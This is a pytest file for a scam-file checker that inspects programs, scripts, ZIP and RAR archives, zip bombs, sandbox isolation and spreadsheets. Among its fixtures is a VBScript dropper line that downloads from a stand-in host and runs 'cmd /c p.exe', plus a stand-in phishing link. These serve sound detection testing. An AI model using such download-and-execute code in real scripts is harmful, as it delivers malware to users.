"""Deeper file checks: members read inside ZIPs, script and program readers, zip-bomb limits, RAR listing, info lines, isolation.
Fixtures are built in code (no real malware) except six tiny archives from the rarfile project's own test set (ISC licence)."""
import hashlib
import os
import struct
import subprocess
import time
import zipfile
from pathlib import Path

from app import filecheck, payload, sandbox
from tests.test_filecheck import ACC, OVL, SMS, apk, client, codes, docx_zip, make_axml, patch_cd, verdict, zipped

RAR = Path(__file__).parent / "fixtures" / "rar"
DROPPER = b'Set x = CreateObject("MSXML2.XMLHTTP")\nx.Open "GET", "http://a.example/p", False\nCreateObject("WScript.Shell").Run "cmd /c p.exe"'


def make_pe(signed=False, packed=False, dll=False, bits64=False) -> bytes:
    """A header-only Windows program: DOS stub pointer, PE signature, COFF header, optional header with a certificate entry, one section."""
    optsize = 0xF0 if bits64 else 0xE0
    opt = bytearray(optsize)
    struct.pack_into("<H", opt, 0, 0x20B if bits64 else 0x10B)
    if signed:
        struct.pack_into("<II", opt, (112 if bits64 else 96) + 32, 1000, 256)
    coff = struct.pack("<HHIIIHH", 0x8664 if bits64 else 0x14C, 1, 0, 0, 0, optsize, 0x2022 if dll else 0x0022)
    dos = bytearray(0x40)
    dos[:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)
    section = (b"UPX0" if packed else b".text").ljust(8, b"\0") + b"\0" * 32
    return bytes(dos) + b"PE\0\0" + coff + bytes(opt) + section


def full(name, data, chat=False):
    return filecheck.inspect(name, data, chat)


# ---------------------------------------------------------------- programs and scripts
def test_program_header_facts_and_packer():
    c, f = payload.analyze_pe(make_pe())
    assert c == [] and "no digital signature" in f and "(32-bit)" in f
    c, f = payload.analyze_pe(make_pe(signed=True, bits64=True))
    assert c == [] and "carries a digital signature that Tulen did not check" in f and "(64-bit)" in f
    assert payload.analyze_pe(make_pe(packed=True))[0] == ["file_exe_packed"]
    assert "library" in payload.analyze_pe(make_pe(dll=True))[1]
    for junk in (b"MZ", b"MZ" + b"\0" * 80, make_pe()[:50], b"MZ" + b"\xff" * 200):
        assert payload.analyze_pe(junk)[0] == []  # odd headers give nothing, never an error


def test_script_that_downloads_and_starts_is_strong_a_plain_one_is_not():
    assert "file_script_dropper" in codes("bil.vbs", DROPPER)
    assert verdict("bil.vbs", DROPPER) == "likely_scam"
    plain = b"@echo off\necho hello world\n"
    assert codes("setup.bat", plain) == ["file_script"]
    assert verdict("setup.bat", plain) == "caution"
    only_download = b'Set x = CreateObject("MSXML2.XMLHTTP")'
    assert "file_script_dropper" not in codes("a.vbs", only_download)  # fetching alone is common in real scripts
    utf16 = DROPPER.decode().encode("utf-16")
    assert "file_script_dropper" in codes("b.vbs", utf16)


def test_signed_or_unsigned_program_alone_stays_caution():
    assert codes("sqlyog.exe", make_pe(signed=True)) == ["file_script"]
    assert verdict("sqlyog.exe", make_pe()) == "caution"
    assert "file_exe_packed" in codes("tool.exe", make_pe(packed=True))
    assert "Windows program" in full("tool.exe", make_pe())[0] and "no digital signature" in full("tool.exe", make_pe())[3]


# ---------------------------------------------------------------- members inside a zip
def test_members_are_read_and_judged():
    assert "file_script_disguised" in codes("docs.zip", zipped({"photo.jpg": make_pe()}))  # a program wearing an image name
    assert verdict("docs.zip", zipped({"photo.jpg": make_pe()})) == "likely_scam"
    z = zipped({"holiday.pdf": b"%PDF-1.4", "app.apk": apk("com.x.card", [SMS, OVL])})
    label, inner, cs, facts = full("kad.zip", z)
    assert "file_apk_takeover" in cs and "Inside app.apk" in facts and "App package" in facts  # the manifest check runs on an app inside a zip
    assert "file_macro" in codes("a.zip", zipped({"report.docm": docx_zip({"word/vbaProject.bin": "x"})}))
    assert "file_exe_packed" in codes("a.zip", zipped({"tool.exe": make_pe(packed=True)}))
    assert "file_script_dropper" in codes("a.zip", zipped({"bil.vbs": DROPPER}))
    assert "file_office_remote" in codes("a.zip", zipped({"n.docx": docx_zip(ext_rels='<Relationships><Relationship Type="x/attachedTemplate" Target="http://a.example/t" TargetMode="External"/></Relationships>')}))


def test_nested_zip_is_listed_one_level_not_opened_further():
    inner = zipped({"setup.exe": b"MZ"})
    outer = zipped({"inner.zip": inner})
    assert "file_script" in codes("o.zip", outer)  # the inner list is read
    deeper = zipped({"mid.zip": zipped({"in.zip": zipped({"setup.exe": b"MZ"})})})
    assert "file_script" not in codes("d.zip", deeper)  # but the third level is not opened


def test_benign_zip_with_members_has_no_signs():
    z = zipped({"jan.pdf": b"%PDF-1.4 x", "feb.pdf": b"%PDF-1.4 y", "logo.png": bytes.fromhex("89504e470d0a1a0a") + b"0" * 20})
    assert codes("payslips.zip", z) == []


# ---------------------------------------------------------------- zip bombs
def test_honest_huge_member_is_never_decompressed():
    z = zipped({"a.exe": b"\0" * (20 * 1024 * 1024)})  # 20 MB of zeros, a few KB on disk
    b = filecheck.Budget()
    t = time.perf_counter()
    cs = filecheck.inspect("bomb.zip", z, False, 0, b)[2]
    assert "file_script" in cs  # the name still counts
    assert filecheck.BUDGET_BYTES - b.left < 64  # only the 8 sniffed bytes were decompressed
    assert time.perf_counter() - t < 2


def test_lying_header_is_caught_after_a_few_bytes():
    z = patch_cd(zipped({"a.exe": b"\0" * (5 * 1024 * 1024)}), 0, 24, "<I", 10)  # header says 10 bytes, the data holds 5 MB
    b = filecheck.Budget()
    cs = filecheck.inspect("bomb.zip", z, False, 0, b)[2]
    assert "file_unreadable" in cs  # zipfile stops at the declared size and the checksum fails
    assert filecheck.BUDGET_BYTES - b.left < 64


def test_budget_caps_total_decompression_across_members():
    z = zipped({f"m{i}.exe": b"\0" * (3 * 1024 * 1024) for i in range(12)})
    b = filecheck.Budget()
    cs = filecheck.inspect("many.zip", z, False, 0, b)[2]
    assert b.hit and "file_unreadable" in cs
    assert 0 <= b.left <= filecheck.BUDGET_BYTES and filecheck.BUDGET_BYTES - b.left <= filecheck.BUDGET_BYTES


def test_odd_compression_encryption_and_overlap_are_never_read():
    lzma = zipfile.ZIP_LZMA
    import io
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", lzma) as zf:
        zf.writestr("a.exe", b"\0" * 100000)
    b = filecheck.Budget()
    assert "file_unreadable" in filecheck.inspect("l.zip", buf.getvalue(), False, 0, b)[2] and b.left == filecheck.BUDGET_BYTES
    enc = patch_cd(zipped({"a.exe": b"MZ" + b"\0" * 50}), 0, 8, "<H", 1)
    b = filecheck.Budget()
    assert "file_encrypted" in filecheck.inspect("e.zip", enc, False, 0, b)[2] and b.left == filecheck.BUDGET_BYTES
    ov = patch_cd(zipped({"a.txt": "a" * 50, "b.exe": "b" * 50}), 1, 42, "<I", 10)
    b = filecheck.Budget()
    assert "file_zip_tricks" in filecheck.inspect("o.zip", ov, False, 0, b)[2] and b.left == filecheck.BUDGET_BYTES  # flagged archives are not decompressed


# ---------------------------------------------------------------- RAR (listed with rarfile, never opened)
def rar(n):
    return (RAR / n).read_bytes()


def test_rar_listing_and_signs():
    label, inner, cs, _ = full("a.rar", rar("rar5-solid.rar"))
    assert label == "RAR archive" and inner == ["stest1.txt", "stest2.txt"] and cs == []
    assert full("b.rar", rar("rar3-solid.rar"))[2] == []
    assert full("c.rar", rar("rar5-psw.rar"))[2] == ["file_encrypted"]  # file contents are protected
    assert full("d.rar", rar("rar5-hpsw.rar"))[2] == ["file_encrypted"]  # even the file names are protected
    assert "file_zip_tricks" in full("e.rar", rar("rar5-evil-symlink-traversal.rar"))[2]
    assert full("f.rar", rar("rar3-comment-plain.rar"))[2] == ["file_archive_closed"]  # an old comment needs an outside tool: not opened
    assert full("g.rar", bytes.fromhex("526172211a070100") + bytes(200))[2] == ["file_unreadable"]  # a RAR signature and nothing real
    assert verdict("a.rar", rar("rar5-solid.rar")) == "caution"


def test_rar_never_runs_an_outside_tool():
    import rarfile
    for t in ("UNRAR_TOOL", "UNAR_TOOL", "BSDTAR_TOOL", "SEVENZIP_TOOL", "SEVENZIP2_TOOL"):
        assert getattr(rarfile, t) == "tulen-never-runs-a-tool"


# ---------------------------------------------------------------- what we checked, the fingerprint, isolation
def api(name, data, chat=False):
    h = {"X-Filename": name, "X-Via-Chat": "1" if chat else "0"}
    r = client.post("/api/analyze-file?language=en", content=data, headers=h)
    assert r.status_code == 200, r.text
    return r.json()["files"][0]


def test_every_file_result_says_what_was_and_was_not_checked_and_carries_a_fingerprint():
    z = zipped({"jan.pdf": b"%PDF-1.4"})
    f = api("p.zip", z)
    reasons = {r["code"]: r for r in f["result"]["scam"]["reasons"]}
    assert reasons["file_checked"]["kind"] == "info" and "not a virus scan" in reasons["file_checked"]["text"]
    assert reasons["file_out_of_scope"]["kind"] == "info"  # nothing wrong found, but not a letter either
    assert f["sha256"] == hashlib.sha256(z).hexdigest()
    risky = api("bil.pdf.exe", make_pe())
    codes_ = {r["code"]: r["kind"] for r in risky["result"]["scam"]["reasons"]}
    assert codes_["file_checked"] == "info" and "file_out_of_scope" not in codes_ and codes_["file_script_disguised"] == "risk"
    assert api("note.docx", docx_zip())["sha256"] is None  # letters are never fingerprinted


def test_inspection_runs_in_a_child_process_with_no_secrets(monkeypatch):
    seen = {}
    real = subprocess.run

    def spy(cmd, **kw):
        seen["env"], seen["cmd"] = kw["env"], cmd
        return real(cmd, **kw)

    monkeypatch.setattr(sandbox.subprocess, "run", spy)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test-secret")
    monkeypatch.setenv("EMAIL_WEBHOOK_SECRET", "hook-secret")
    z = zipped({"a.exe": b"MZ"})
    assert sandbox.inspect_isolated("a.zip", z, True) == filecheck.inspect("a.zip", z, True)
    assert "ANTHROPIC_API_KEY" not in seen["env"] and "EMAIL_WEBHOOK_SECRET" not in seen["env"]
    assert "app.inspect_worker" in seen["cmd"]


def test_a_crashing_or_hanging_child_is_reported_not_raised(monkeypatch):
    def hang(cmd, **kw):
        raise subprocess.TimeoutExpired(cmd, 1)

    monkeypatch.setattr(sandbox.subprocess, "run", hang)
    assert sandbox.inspect_isolated("a.zip", b"PK\x03\x04", False)[2] == ["file_unreadable"]

    class Bad:
        returncode, stdout = 1, b"not json"

    monkeypatch.setattr(sandbox.subprocess, "run", lambda cmd, **kw: Bad())
    assert sandbox.inspect_isolated("a.zip", b"x", False)[2] == ["file_unreadable"]
    assert make_axml("a.b.c")  # keeps the shared builder imported for the next test file


# ---------------------------------------------------------------- files have their own flow (no agent, no letter content)
def no_model(monkeypatch):
    """Any call into the agent or the explainer fails the test: a file must never reach a model."""
    def boom(*a, **k):
        raise AssertionError("a file reached the AI agent or the explainer")
    from app import llm
    from app.agent import loop as lp
    monkeypatch.setattr(lp, "_ask", boom)
    monkeypatch.setattr(llm, "complete", boom)
    monkeypatch.setattr(llm, "chat", boom)
    monkeypatch.setitem(__import__("app.agent.tools", fromlist=["TOOLS"]).TOOLS["llm.explain"].__dict__, "fn", boom)


def test_a_file_never_reaches_the_agent_or_the_explainer(monkeypatch):
    no_model(monkeypatch)
    f = api("bil.pdf.exe", make_pe())
    assert f["status"] == "ok"
    x = f["result"]
    assert x["scam"]["verdict"] == "likely_scam" and x["fields"]["letter_type"] == "File"
    assert x["agent"]["mode"] != "ai" and x["agent"]["rounds"] == 0
    tools_used = {s["tool"] for s in x["trace"] if s.get("tool")}
    assert "file.inspect" in tools_used and not tools_used & {"classify.issuer", "extract.fields", "office.locate"}  # no letter steps


def test_the_file_result_is_about_files_not_about_an_agency(monkeypatch):
    no_model(monkeypatch)
    x = api("bil.pdf.exe", make_pe(), chat=True)["result"]
    assert x["lesson"]["question"] == "Why did I get this file?" and "ZIP files, programs, scripts" in x["lesson"]["answer"]
    assert x["scam"]["scam_type"] == "whatsapp_file"
    first = x["route"]["online_steps"][0]
    assert first.startswith("Do not open the file") and "agency counter" not in " ".join(x["route"]["walkin_steps"])
    assert x["explanation"].startswith("This file shows signs of a scam delivery:")
    assert x["fields"]["amount"] is None and x["fields"]["deadline"] is None and x["action"]["reminder"] is None
    assert "SCAM REPORT" in x["action"]["draft"]
    app_x = api("app.apk", apk("com.x.card", [SMS, OVL]))["result"]
    assert app_x["scam"]["scam_type"] == "apk_install"  # an app keeps its own lesson


def test_caution_and_out_of_scope_files_get_matching_words_in_every_language(monkeypatch):
    no_model(monkeypatch)
    z = zipped({"jan.pdf": b"%PDF-1.4"})
    scope = api("p.zip", z)["result"]["explanation"]
    assert scope.startswith("Tulen found no signs of scam delivery") and "not look like a letter" in scope and "safe" not in scope.lower().replace("scam delivery", "")
    caution = api("setup.exe", make_pe())["result"]["explanation"]
    assert caution.startswith("Tulen found things worth checking") and "not a virus scan" in caution
    r = client.post("/api/analyze-file?language=bm", content=z, headers={"X-Filename": "p.zip"})
    assert "Tulen tidak menjumpai tanda" in r.json()["files"][0]["result"]["explanation"]
    r = client.post("/api/analyze-file?language=zh", content=make_pe(), headers={"X-Filename": "setup.exe"})
    assert "不是病毒扫描" in r.json()["files"][0]["result"]["explanation"]


def test_letters_still_take_the_letter_flow():
    x = api("letter.docx", docx_zip())["result"]
    assert x["fields"]["letter_type"] != "File" and x["lesson"]["question"] != "Why did I get this file?"


# ---------------------------------------------------------------- .xlsx is a letter format too, macros first
NS_S = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"


def xlsx(cells, extra=None, rels=None):
    sst = f'<sst xmlns="{NS_S}">' + "".join(f"<si><t>{c}</t></si>" for c in cells) + "</sst>"
    files = {"[Content_Types].xml": "<x/>", "xl/workbook.xml": f'<workbook xmlns="{NS_S}"/>', "xl/sharedStrings.xml": sst}
    files.update(extra or {})
    if rels:
        files["xl/worksheets/_rels/sheet1.xml.rels"] = rels
    return zipped(files)


def test_xlsx_text_and_links_are_read_like_a_letter():
    from app import ingest
    link = '<Relationships><Relationship Id="r1" Type="http://x/relationships/hyperlink" Target="http://evil.example/pay" TargetMode="External"/></Relationships>'
    d = ingest.extract("notis.xlsx", None, xlsx(["Notis LHDN", "Bayar RM 500 sebelum 30 November"], rels=link))[0]
    assert d.kind == "xlsx" and "Notis LHDN" in d.text and "Bayar RM 500" in d.text and "evil.example/pay" in d.text
    assert ingest.extract("empty.xlsx", None, xlsx([]))[0].text.strip() == ""


def test_a_workbook_with_macros_takes_the_file_flow_before_anything_is_read(monkeypatch):
    from app import ingest
    macro = xlsx(["Notis LHDN"], extra={"xl/vbaProject.bin": "x"})
    assert ingest.detect("book.xlsx", None, macro) == "file_risk"  # macros are checked first, whatever the extension says
    assert ingest.detect("book.xlsm", None, xlsx(["a"])) == "file_risk"
    assert ingest.detect("book.xlsx", None, xlsx(["a"])) == "xlsx"
    no_model(monkeypatch)
    x = api("book.xlsx", macro, chat=True)["result"]
    assert x["fields"]["letter_type"] == "File" and x["scam"]["verdict"] == "likely_scam"  # hidden macro sent by chat


def test_other_office_formats_are_still_refused():
    from app import ingest
    import pytest
    pptx = zipped({"[Content_Types].xml": "<x/>", "ppt/presentation.xml": "<a/>"})
    with pytest.raises(ingest.IngestError) as e:
        ingest.extract("a.pptx", None, pptx)
    assert e.value.status == 415 and "DOCX" in e.value.detail and "XLSX" in e.value.detail
